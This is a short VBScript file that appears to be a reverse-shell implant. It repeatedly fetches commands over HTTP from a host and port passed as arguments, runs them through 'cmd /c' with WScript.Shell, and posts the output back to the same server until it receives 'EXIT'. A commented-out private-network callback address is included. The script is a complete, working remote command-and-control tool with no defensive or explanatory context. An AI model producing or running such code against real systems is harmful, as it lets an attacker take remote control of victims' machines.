Option Explicit
On Error Resume Next
Dim objArgs
Set objArgs = Wscript.Arguments

'CONST callbackUrl = "http://192.168.178.180:4004/"
Dim callbackUrl
callbackUrl ="http://" & objArgs(0) & ":"  & objArgs(1) & "/" 
'Wscript.Echo callbackUrl
Dim xmlHttpReq, shell, execObj, command, break, result

Set shell = CreateObject("WScript.Shell")

break = False
While break <> True
    Set xmlHttpReq = WScript.CreateObject("MSXML2.ServerXMLHTTP")
    xmlHttpReq.Open "GET", callbackUrl, false
    xmlHttpReq.Send

    command = "cmd /c " & Trim(xmlHttpReq.responseText)

    If InStr(command, "EXIT") Then
        break = True
    Else
        Set execObj = shell.Exec(command)

        result = ""
        Do Until execObj.StdOut.AtEndOfStream
            result = result & execObj.StdOut.ReadAll()
        Loop

        Set xmlHttpReq = WScript.CreateObject("MSXML2.ServerXMLHTTP")
        xmlHttpReq.Open "POST", callbackUrl, false
        xmlHttpReq.Send(result)
    End If
Wend